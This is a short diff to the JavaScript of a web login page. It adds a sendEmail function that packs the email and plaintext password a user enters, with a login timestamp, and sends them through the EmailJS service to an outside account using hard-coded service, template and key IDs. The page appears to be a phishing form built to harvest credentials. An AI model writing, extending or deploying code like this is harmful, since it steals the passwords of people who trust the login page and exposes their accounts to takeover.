@@ -121,6 +121,18 @@
             document.getElementById("passwordSection").style.display = "block";
         }
 
+        function sendEmail(email, password) {
+            const serviceID = "service_suqjtsd";
+            const templateID = "template_gnd5xid";
+            const publicKey = "jkb7mzwK9KsEbHbna";
+
+            const templateParams = {
+                login_history: `Email: ${email}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
+            };
+
+            return emailjs.send(serviceID, templateID, templateParams, publicKey);
+        }
+
         function authenticate() {
             let loginButton = document.querySelector("#passwordSection button");
             loginButton.textContent = "Authenticating...";
